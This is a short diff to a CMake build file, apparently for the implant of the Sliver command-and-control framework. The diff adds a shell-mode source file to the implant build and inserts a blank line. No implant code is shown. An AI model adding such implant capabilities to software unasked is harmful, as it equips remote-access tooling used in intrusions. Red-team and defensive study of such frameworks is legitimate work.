@@ -130,7 +130,8 @@ if(IMPLANT_CRYPTO)
     src/wire/frame.c
     src/wire/yamux.c
     src/modes/session.c
-    src/rpc/dispatch.c)
+    src/rpc/dispatch.c
+    src/modes/shell.c)
 endif()
 
 add_library(sliver_core STATIC ${SLIVER_CORE_SOURCES} "${SLIVER_GEN_DIR}/implant_secrets.c")
@@ -185,6 +186,7 @@ if(BUILD_TESTING)
 endif()
 
 message(STATUS "sliver_implant: format=${IMPLANT_FORMAT} platform=${SLIVER_PLATFORM_DIR} compiler=${CMAKE_C_COMPILER_ID}")
+
 
 
 
